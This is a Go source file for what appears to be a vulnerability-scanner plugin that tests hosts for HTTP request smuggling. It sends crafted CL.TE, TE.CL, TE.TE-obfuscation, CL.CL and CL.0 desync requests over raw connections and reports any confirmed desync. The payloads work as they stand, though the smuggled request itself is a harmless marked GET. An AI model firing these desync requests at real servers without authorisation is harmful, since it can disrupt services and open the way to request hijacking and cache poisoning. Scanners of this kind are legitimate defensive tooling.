package plugins

import (
	"DORM/models"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"time"
)

type RequestSmugglingPlugin struct{}

func (p *RequestSmugglingPlugin) Name() string { return "HTTP Request Smuggling (Advanced v2)" }

// randomMarker returns a short random hex string so each scan embeds a unique
// smuggled-request signature instead of a static, easily fingerprinted one.
func randomMarker() string {
	b := make([]byte, 5)
	if _, err := rand.Read(b); err != nil {
		return "dormrs"
	}
	return hex.EncodeToString(b)
}

func (p *RequestSmugglingPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	marker := randomMarker()
	smugglePath := "/dorm-" + marker
	probePath := "/dorm-probe-" + marker
	// smuggledPrefix is a syntactically valid, harmless GET request. When a
	// desync attack succeeds, these bytes get left in the connection's read
	// buffer and are parsed by one side as the start of a brand-new request.
	smuggledPrefix := fmt.Sprintf("GET %s HTTP/1.1\r\nX-Dorm-Marker: %s", smugglePath, marker)
	requestChunk := smuggledPrefix + "\r\n\r\n"
	chunkBody := "0\r\n\r\n" + requestChunk // 0-size chunk terminates the "legit" body; requestChunk leaks as pipelined bytes

	connect := func() (net.Conn, error) {
		address := net.JoinHostPort(target.IP, strconv.Itoa(target.Port))
		dialer := &net.Dialer{Timeout: 5 * time.Second}
		if target.Port == 443 || target.Port == 8443 {
			return tls.DialWithDialer(dialer, "tcp", address, &tls.Config{InsecureSkipVerify: true})
		}
		return net.DialTimeout("tcp", address, 5*time.Second)
	}

	// containsSmuggleSignature reports whether resp shows evidence that some
	// component actually parsed the smuggled prefix as its own request: the
	// per-scan marker/path leaking back tied to a 404/405 response.
	containsSmuggleSignature := func(resp string) bool {
		if !strings.Contains(resp, marker) {
			return false
		}
		return strings.Contains(resp, "404") || strings.Contains(resp, "405") || strings.Contains(resp, smugglePath)
	}

	// sendAttackThenProbe writes the attack payload, takes a best-effort read
	// of whatever comes back on it, then performs the real desync
	// confirmation: a second, distinct request is written on the SAME
	// connection and its response is inspected. A genuinely desynced backend
	// either answers the unrelated probe with data belonging to the smuggled
	// request, or the connection stalls entirely waiting for bytes the
	// smuggled request already consumed from the pipe.
	sendAttackThenProbe := func(attackPayload, attackName string) *models.Vulnerability {
		conn, err := connect()
		if err != nil {
			return nil
		}
		defer func() { _ = conn.Close() }()

		_ = conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if _, err := conn.Write([]byte(attackPayload)); err != nil {
			return nil
		}

		_ = conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		buf := make([]byte, 4096)
		n, _ := conn.Read(buf)
		if containsSmuggleSignature(string(buf[:n])) {
			return &models.Vulnerability{
				Target:      target,
				Name:        "HTTP Request Smuggling (" + attackName + ")",
				Severity:    "CRITICAL",
				CVSS:        9.8,
				Description: fmt.Sprintf("The %s attack request's own response already leaked the smuggled marker %q tied to a 404/405 — the payload was parsed as two requests by a single component.\n\nPayload:\n%s", attackName, marker, attackPayload),
				Solution:    "Disable HTTP/1.1 connection reuse (Keep-Alive) between the front-end and back-end, or normalize/validate Content-Length and Transfer-Encoding framing consistently at both layers.",
				Reference:   "PortSwigger: HTTP Request Smuggling",
			}
		}

		probeReq := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", probePath, target.IP)
		_ = conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if _, err := conn.Write([]byte(probeReq)); err != nil {
			return nil
		}

		_ = conn.SetReadDeadline(time.Now().Add(5 * time.Second))
		buf2 := make([]byte, 4096)
		n2, err2 := conn.Read(buf2)

		if n2 == 0 && err2 != nil && err2 != io.EOF {
			// The connection went silent after a request it should have
			// answered instantly — consistent with the back-end still
			// blocked on bytes the smuggled prefix consumed. Lower
			// confidence than a content match, reported as HIGH not CRITICAL.
			return &models.Vulnerability{
				Target:      target,
				Name:        "HTTP Request Smuggling (" + attackName + ", blind/timing)",
				Severity:    "HIGH",
				CVSS:        7.5,
				Description: fmt.Sprintf("After the %s attack request, an unrelated follow-up probe on the same connection received no response before timeout — consistent with the back-end being desynced. Lower-confidence signal; verify manually before treating as confirmed.\n\nAttack payload:\n%s", attackName, attackPayload),
				Solution:    "Disable HTTP/1.1 connection reuse (Keep-Alive) between the front-end and back-end, or normalize/validate Content-Length and Transfer-Encoding framing consistently at both layers.",
				Reference:   "PortSwigger: HTTP Request Smuggling",
			}
		}

		if containsSmuggleSignature(string(buf2[:n2])) {
			return &models.Vulnerability{
				Target:      target,
				Name:        "HTTP Request Smuggling (" + attackName + ")",
				Severity:    "CRITICAL",
				CVSS:        9.8,
				Description: fmt.Sprintf("A follow-up probe request for %q (unrelated to the %s attack) came back tied to the smuggled marker %q instead of answering its own path — the connection was desynced by the smuggled request.\n\nAttack payload:\n%s", probePath, attackName, marker, attackPayload),
				Solution:    "Disable HTTP/1.1 connection reuse (Keep-Alive) between the front-end and back-end, or normalize/validate Content-Length and Transfer-Encoding framing consistently at both layers.",
				Reference:   "PortSwigger: HTTP Request Smuggling",
			}
		}

		return nil
	}

	// --- CL.TE: front-end honors Content-Length, back-end honors Transfer-Encoding ---
	clte := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nContent-Length: %d\r\nTransfer-Encoding: chunked\r\n\r\n%s",
		target.IP, len(chunkBody), chunkBody)
	if vuln := sendAttackThenProbe(clte, "CL.TE"); vuln != nil {
		return vuln
	}

	// --- TE.CL: front-end honors Transfer-Encoding, back-end honors Content-Length ---
	// Chunk size is computed from the real request length (not hardcoded),
	// and the front Content-Length is sized to truncate right after the
	// chunk-size line, so only that line is consumed as "the body" by a
	// Content-Length-only parser, leaving requestChunk pipelined.
	chunkSizeHex := fmt.Sprintf("%x", len(requestChunk))
	teClBody := chunkSizeHex + "\r\n" + requestChunk + "0\r\n\r\n"
	frontCL := len(chunkSizeHex) + 2
	tecl := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nContent-Length: %d\r\nTransfer-Encoding: chunked\r\n\r\n%s",
		target.IP, frontCL, teClBody)
	if vuln := sendAttackThenProbe(tecl, "TE.CL"); vuln != nil {
		return vuln
	}

	// --- TE.TE: obfuscated Transfer-Encoding header, hoping front-end and
	// back-end disagree on whether it's honored at all ---
	teteVariants := []struct{ name, header string }{
		{"TE.TE space-before-colon", "Transfer-Encoding : chunked"},
		{"TE.TE tab", "Transfer-Encoding:\tchunked"},
		{"TE.TE duplicate", "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"},
		{"TE.TE chunked-param", "Transfer-Encoding: chunked, identity"},
		{"TE.TE obs-fold", "Transfer-Encoding:\r\n chunked"},
	}
	for _, v := range teteVariants {
		payload := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n%s\r\n\r\n%s",
			target.IP, v.header, chunkBody)
		if vuln := sendAttackThenProbe(payload, v.name); vuln != nil {
			return vuln
		}
	}

	// --- CL.CL: duplicate Content-Length headers with conflicting values ---
	shortBody := "x"
	fullBody := shortBody + requestChunk
	clcl := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nContent-Length: %d\r\nContent-Length: %d\r\n\r\n%s",
		target.IP, len(shortBody), len(fullBody), fullBody)
	if vuln := sendAttackThenProbe(clcl, "CL.CL"); vuln != nil {
		return vuln
	}

	// --- CL.0: back-end treats the body as zero-length on some routes
	// (e.g. a static-file handler) while the front-end forwards it whole ---
	cl0 := fmt.Sprintf("POST /static/1 HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nContent-Length: %d\r\n\r\n%s",
		target.IP, len(requestChunk), requestChunk)
	if vuln := sendAttackThenProbe(cl0, "CL.0"); vuln != nil {
		return vuln
	}

	return nil
}
